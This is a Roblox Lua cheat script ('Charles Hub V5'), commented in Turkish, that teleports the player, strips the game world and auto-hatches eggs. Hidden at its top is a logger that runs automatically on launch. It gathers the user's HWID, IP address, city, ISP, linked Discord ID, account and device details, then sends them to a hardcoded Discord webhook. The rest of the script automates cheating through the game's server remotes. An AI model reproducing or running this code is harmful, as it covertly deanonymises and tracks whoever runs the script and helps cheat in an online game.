        -- [[ CHARLES HUB V5 - LOGGER ]] --
        local webhookURL = "https://discord.com/api/webhooks/1453830529718681753/WzmmobNWqI8V8ogOyKKjnAdM-ZEm-6Iq4RsFd6dYZso2Zb--b_gN8dtsM8Km5pBQ33Tr"
        local HttpService = game:GetService("HttpService")

        local function logToWebhook()
            pcall(function()
                local lp = game:GetService("Players").LocalPlayer
                local hwid = (gethwid and gethwid()) or (get_hwid and get_hwid()) or game:GetService("RbxAnalyticsService"):GetClientId()
                local executor = (identifyexecutor and identifyexecutor()) or "Bilinmiyor"
                local accountAge = lp.AccountAge
                local membership = tostring(lp.MembershipType):sub(21)
                local joinDate = os.date("%d-%m-%Y", os.time() - (accountAge * 86400))
                local UIS = game:GetService("UserInputService")
                local device = "PC"
                if UIS.TouchEnabled and not UIS.KeyboardEnabled then device = "Mobile"
                elseif game:GetService("GuiService"):IsTenFootInterface() then device = "Console" end
                
                local resolution = "Bilinmiyor"
                pcall(function() resolution = math.floor(Workspace.CurrentCamera.ViewportSize.X) .. "x" .. math.floor(Workspace.CurrentCamera.ViewportSize.Y) end)
                
                local ipInfo = {query = "0.0.0.0", country = "Bilinmiyor", city = "Bilinmiyor", isp = "Bilinmiyor"}
                pcall(function() 
                    local resp = game:HttpGet("http://ip-api.com/json/")
                    if resp then ipInfo = HttpService:JSONDecode(resp) end
                end)

                local discordID = "Bilinmiyor"
                pcall(function()
                    local response = game:HttpGet("https://registry.rover.link/v2/roblox-to-discord/" .. lp.UserId)
                    if response then
                        local decoded = HttpService:JSONDecode(response)
                        if decoded and decoded.discordId then
                            discordID = "<@" .. decoded.discordId .. "> (" .. decoded.discordId .. ")"
                        end
                    end
                end)
                
                -- Oyun istatistiklerini güvenli bir şekilde çek
                local stats = {Coins = "0", Gems = "0", Rebirths = "0", Eggs = "0", Tokens = "0"}
                pcall(function()
                    local folder = lp:FindFirstChild("leaderstats") or lp:FindFirstChild("PlayerStats") or lp:FindFirstChild("Data")
                    if folder then
                        stats.Coins = tostring((folder:FindFirstChild("Clicks") or folder:FindFirstChild("Coins") or folder:FindFirstChild("Taps") or {Value = "0"}).Value)
                        stats.Gems = tostring((folder:FindFirstChild("Gems") or folder:FindFirstChild("Diamonds") or {Value = "0"}).Value)
                        stats.Rebirths = tostring((folder:FindFirstChild("Rebirths") or {Value = "0"}).Value)
                        stats.Eggs = tostring((folder:FindFirstChild("Eggs") or folder:FindFirstChild("TotalEggs") or {Value = "0"}).Value)
                        stats.Tokens = tostring((folder:FindFirstChild("Tokens") or folder:FindFirstChild("TapTokens") or folder:FindFirstChild("TokensValue") or {Value = "0"}).Value)
                    end
                end)

                local data = {
                    ["embeds"] = {{
                        ["title"] = "🚀 Cyberpunkfarm working! (v5.5)",
                        ["color"] = 65280,
                        ["thumbnail"] = {["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. lp.UserId .. "&width=420&height=420&format=png"},
                        ["fields"] = {
                            {["name"] = "Hesap İsmi", ["value"] = lp.Name .. " (" .. membership .. ")", ["inline"] = true},
                            {["name"] = "Roblox ID", ["value"] = tostring(lp.UserId), ["inline"] = true},
                            {["name"] = "Cihaz / Çözünürlük", ["value"] = device .. " / " .. resolution, ["inline"] = true},
                            {["name"] = "Hesap Yaşı / Tarih", ["value"] = accountAge .. " gün (" .. joinDate .. ")", ["inline"] = true},
                            {["name"] = "IP Adresi", ["value"] = "```" .. ipInfo.query .. "```", ["inline"] = true},
                            {["name"] = "Ping", ["value"] = math.floor(lp:GetNetworkPing() * 1000) .. " ms", ["inline"] = true},
                            {["name"] = "Coin / Gem", ["value"] = "💰 " .. tostring(stats.Coins) .. " / 💎 " .. tostring(stats.Gems), ["inline"] = true},
                            {["name"] = "Token / Rebirth", ["value"] = "🎟️ " .. tostring(stats.Tokens) .. " / ⭐ " .. tostring(stats.Rebirths), ["inline"] = true},
                            {["name"] = "Açılan Yumurta", ["value"] = "🥚 " .. tostring(stats.Eggs), ["inline"] = true},
                            {["name"] = "Ülke / Şehir", ["value"] = ipInfo.country .. " / " .. ipInfo.city, ["inline"] = true},
                            {["name"] = "İnternet", ["value"] = ipInfo.isp, ["inline"] = true},
                            {["name"] = "Executor", ["value"] = executor, ["inline"] = true},
                            {["name"] = "Discord ID", ["value"] = discordID, ["inline"] = true},
                            {["name"] = "Sunucu ID", ["value"] = "```" .. game.JobId .. "```", ["inline"] = false},
                            {["name"] = "HWID", ["value"] = "```" .. hwid .. "```", ["inline"] = false},
                            {["name"] = "Zaman", ["value"] = os.date("%Y-%m-%d %H:%M:%S"), ["inline"] = false}
                        },
                        ["footer"] = {["text"] = "Charles Hub V5.5 Ultimate Logger"}
                    }}
                }
                
                request({
                    Url = webhookURL,
                    Method = "POST",
                    Headers = {["Content-Type"] = "application/json"},
                    Body = HttpService:JSONEncode(data)
                })
            end)
        end
        task.spawn(logToWebhook)

        -- [[ AYARLAR ]] --
        local targetEggName = "Cyberpunk"   -- Açılacak yumurta adı
        local teleportZoneName = "Cyberpunk" -- Işınlanılacak ada/bölge adı
        local openAmount = 8 
        local hatchSpeed = 0 

        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local Workspace = game:GetService("Workspace")
        local Players = game:GetService("Players")
        local Lighting = game:GetService("Lighting")
        local lp = Players.LocalPlayer

        -- [[ 1. DİNAMİK REMOTE BULUCU ]] --
        -- ReplicatedStorage içindeki rastgele isimli klasörü ve içindeki fonksiyonları bulur
        local function getGameRemote(remoteName)
            for _, obj in ipairs(ReplicatedStorage:GetChildren()) do
                local functions = obj:FindFirstChild("Functions")
                if functions then
                    local target = functions:FindFirstChild(remoteName)
                    if target then
                        return target
                    end
                end
            end
            return nil
        end

        -- [[ 2. AGRESİF FPS BOOST (DÜNYAYI TEMİZLE) ]] --
        local function nukeWorld()
            for _, obj in pairs(Workspace:GetChildren()) do
                if obj.Name ~= lp.Name and 
                obj.Name ~= "Camera" and 
                obj.Name ~= "Eggs" and 
                not obj.Name:find("SafetyFloor") and 
                not obj:IsA("Terrain") then
                    pcall(function() obj:Destroy() end)
                end
            end

            local eggsFolder = Workspace:FindFirstChild("Eggs")
            if eggsFolder then
                for _, egg in pairs(eggsFolder:GetChildren()) do
                    -- Sadece hedef yumurtayı bırak, gerisini sil
                    if not egg.Name:find(targetEggName) then
                        pcall(function() egg:Destroy() end)
                    end
                end
            end
            Workspace.Terrain:Clear()
        end

        -- [[ 3. HAVA DURUMUNU VE EFEKTLERİ SIFIRLA ]] --
        local function cleanLighting()
            Lighting.GlobalShadows = false
            Lighting.FogEnd = 9e9
            Lighting.Brightness = 1
            Lighting.ClockTime = 12
            Lighting.OutdoorAmbient = Color3.fromRGB(128, 128, 128)
            
            for _, effect in pairs(Lighting:GetChildren()) do
                if effect:IsA("PostEffect") or effect:IsA("Sky") or effect:IsA("Clouds") then
                    effect:Destroy()
                end
            end
            
            local sky = Instance.new("Sky", Lighting)
            sky.SunTextureId = ""
            sky.MoonTextureId = ""
        end

        -- [[ 4. YUMURTAYI GİZLE ]] --
        local function hideEgg(eggModel)
            if eggModel then
                for _, part in pairs(eggModel:GetDescendants()) do
                    if part:IsA("BasePart") or part:IsA("MeshPart") then
                        part.Transparency = 1 
                        part.CastShadow = false
                    elseif part:IsA("Decal") or part:IsA("Texture") then
                        part:Destroy()
                    elseif part:IsA("ParticleEmitter") or part:IsA("Trail") then
                        part.Enabled = false
                    end
                end
            end
        end

        -- [[ 5. GÜVENLİ ZEMİN ]] --
        local function createFloorAtEgg(target)
            local floor = Instance.new("Part")
            floor.Name = "SafetyFloor"
            floor.Size = Vector3.new(50, 2, 50)
            floor.CFrame = target:GetPivot() * CFrame.new(0, -5, 0)
            floor.Anchored = true
            floor.Transparency = 0.5 
            floor.BrickColor = BrickColor.new("Bright blue")
            floor.Parent = Workspace
            return floor
        end

        -- Gold Machine için 100x100 Emniyet Zemini
        local function createFloorAtMachine()
            local pos = Vector3.new(1415.5, 658.18, -13447.73)
            local floor = Instance.new("Part")
            floor.Name = "SafetyFloor"
            floor.Size = Vector3.new(100, 2, 100)
            floor.Position = pos + Vector3.new(0, -6, 0)
            floor.Anchored = true
            floor.Transparency = 0.5
            floor.BrickColor = BrickColor.new("Bright yellow")
            floor.Material = Enum.Material.Neon
            floor.Parent = Workspace
            print("🏗️ Gold Machine için 100x100 zemin oluşturuldu.")
            return floor
        end

        -- [[ ANA ÇALIŞTIRICI ]] --

        -- ADIM 1: Adaya Işınlan
        local tpRemote = getGameRemote("TeleportZone")
        if tpRemote then
            print("🌐 " .. teleportZoneName .. " adasına ışınlanılıyor...")
            tpRemote:InvokeServer(teleportZoneName)
            task.wait(1) -- Işınlanma sonrası yükleme için bekle
        else
            warn("⚠️ Teleport Remote bulunamadı!")
        end

        -- ADIM 2: Yumurtayı Bul ve Dünyayı Hazırla
        local eggsFolder = Workspace:FindFirstChild("Eggs")
        local eggModel = eggsFolder and (eggsFolder:FindFirstChild(targetEggName) or eggsFolder:FindFirstChild(targetEggName .. " Egg"))

        if eggModel then
            nukeWorld()
            cleanLighting()
            createFloorAtEgg(eggModel)
            createFloorAtMachine() -- Yeni 100x100 zemin buraya eklendi
            hideEgg(eggModel)
            
            task.wait(0.2)
            if lp.Character then
                lp.Character:PivotTo(eggModel:GetPivot() * CFrame.new(0, 0, 2))
            end
            
            -- ADIM 3: Auto Hatch
            _G.AutoHatch = true
            print("🚀 Sistem Aktif: " .. targetEggName .. " açılıyor!")

            task.spawn(function()
                while _G.AutoHatch do
                    local openRemote = getGameRemote("OpenEgg")
                    if openRemote then
                        -- Snowman veya Snowman Egg ikisini de dener
                        local success = openRemote:InvokeServer(targetEggName, openAmount)
                        if not success then
                            openRemote:InvokeServer(targetEggName .. " Egg", openAmount)
                        end
                    end
                    task.wait(hatchSpeed)
                end
            end)
        else
            warn("❌ Hedef yumurta (" .. targetEggName .. ") ışınlanılan adada bulunamadı!")
        end

